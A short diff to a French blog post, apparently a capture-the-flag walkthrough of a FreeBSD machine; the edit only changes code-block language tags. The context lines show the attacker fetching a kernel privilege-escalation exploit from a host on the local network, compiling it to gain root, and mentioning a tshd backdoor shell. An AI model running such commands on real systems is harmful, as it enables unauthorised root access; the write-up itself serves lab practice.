@@ -141,7 +141,7 @@ On va pouvoir rapatrier un *tshd* (voir mes précédents articles) et le compile
 
 Une fois qu'on a un shell digne de ce nom, il nous reste plus qu'à passer root. On trouve [un exploit pour le kernel 9 sur exploit-db](http://www.exploit-db.com/exploits/26368/) :  
 
-```bash
+```console
 $ fetch http://192.168.1.3:8000/sploit.c
 sploit.c                                      100% of 2215  B   17 MBps
 $ gcc -o sploit sploit.c
@@ -208,7 +208,7 @@ default it would've blocked your IP (both in hosts.allow & Firewall) for
 
 Une petite vérification de la configuration *d'Apache* (dans /usr/local/etc/apache22/) pour nos problèmes de 403 confirme les soupçons que l'on avait :  
 
-```
+```apache
 SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser
 
 <VirtualHost *:8080>
